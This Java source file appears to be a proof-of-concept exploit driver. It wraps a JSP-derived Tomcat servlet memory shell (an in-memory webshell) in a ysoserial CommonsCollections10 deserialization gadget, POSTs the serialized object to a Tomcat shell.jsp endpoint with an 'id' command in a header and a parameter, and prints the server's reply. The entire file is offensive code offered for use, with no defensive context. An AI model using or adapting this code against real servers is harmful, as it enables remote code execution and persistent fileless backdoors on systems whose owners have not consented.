package tomcat;

import myframework.HttpRequest;
import myframework.ReadWrite;
import myframework.ser.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.Eval;

public class UseJsp {
    public static void main(String[] args) throws Exception{
        String url = "http://wsl.com:8080/tomcattest/shell.jsp";
        Object evil = poc();
        byte[] ser = Serializer.serialize(evil);

        byte[] resp = new HttpRequest(url).addHeader("cmd","id").addPostData(ser).addParam("cmd","id").send();
        System.out.println(new String(resp));
    }
    public static Object poc() throws Exception{
        String jspcode = new String(ReadWrite.readResource(UseJsp.class, "内存马/tomcat/servlet内存马.jsp"));
        String javacode = Eval.getJavaCodeFromJSP(jspcode);
        Object o = new Eval().getObject(CommonsCollections10.class,javacode);
        return o;
    }
}
